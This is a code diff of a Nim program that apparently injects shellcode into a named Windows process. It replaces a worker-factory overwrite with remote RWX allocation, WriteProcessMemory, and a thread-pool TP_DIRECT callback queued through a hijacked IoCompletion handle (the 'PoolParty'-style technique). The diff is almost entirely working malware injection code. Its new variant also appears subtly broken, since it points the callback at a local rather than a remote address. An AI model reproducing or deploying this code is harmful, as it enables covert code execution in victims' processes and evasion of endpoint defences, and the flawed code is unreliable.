@@ -65,35 +65,45 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
         cast[DWORD](getPid(processName))
         )
 
-    # Duplicate target worker factory handle
-    var workerFactoryHandle = hijackProcessHandle(newWideCString("TpWorkerFactory"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
+    # # Duplicate target worker factory handle
+    # var workerFactoryHandle = hijackProcessHandle(newWideCString("TpWorkerFactory"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
 
-    # Query target worker factory
-    var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
-    NtQueryInformationWorkerFactory(
-        workerFactoryHandle,
-        WorkerFactoryInfoClass.WorkerFactoryBasicInformation,
-        addr WorkerFactoryInformation,
-        cast[ULONG](sizeof(WorkerFactoryInformation)),
-        NULL
-        )
+    # # Query target worker factory
+    # var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
+    # NtQueryInformationWorkerFactory(
+    #     workerFactoryHandle,
+    #     WorkerFactoryInfoClass.WorkerFactoryBasicInformation,
+    #     addr WorkerFactoryInformation,
+    #     cast[ULONG](sizeof(WorkerFactoryInformation)),
+    #     NULL
+    #     )
 
-    # Overwrite worker factory start routine shellcode
-    let wSuccess = WriteProcessMemory(
+    # Allocating memory in target process
+    let targetPtr = VirtualAllocEx(
+        targetHandle,
+        NULL,
+        cast[SIZE_T](shellcodeBytes.len),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READ_WRITE
+    )
+
+    # Writing shellcode to target process
+    var bytesWritten: SIZE_T
+    WriteProcessMemory(
         targetHandle, 
-        WorkerFactoryInformation.StartRoutine,
+        targetPtr,
         shellcodeBytesPtr,
         cast[SIZE_T](shellcodeBytes.len),
-        NULL
+        addr bytesWritten
     )
-    var newThreadMinimum = WorkerFactoryInformation.TotalWorkerCount + 1
-    NtSetInformationWorkerFactory(
-        workerFactoryHandle, 
-        WorkerFactoryInfoClass.WorkerFactoryThreadMinimum, 
-        addr newThreadMinimum, 
-        cast[ULONG](sizeof(ULONG))
-        )
 
+    # Varient 7 ?
+    var Direct: TP_DIRECT
+    Direct.Callback = shellcodeBytesPtr
+    var RemoteDirectAddress: PTP_DIRECT = cast[PTP_DIRECT](VirtualAllocEx(targetHandle, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
+    discard NtWriteVirtualMemory(targetHandle, RemoteDirectAddress, addr Direct, sizeof(TP_DIRECT), NULL)
+    var IoCompletionHandle = hijackProcessHandle(newWideCString("IoCompletion"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
+    ZwSetIoCompletion(IoCompletionHandle, RemoteDirectAddress, NULL, 0, 0)
 
 proc wrapExecute() =
     discard execute(
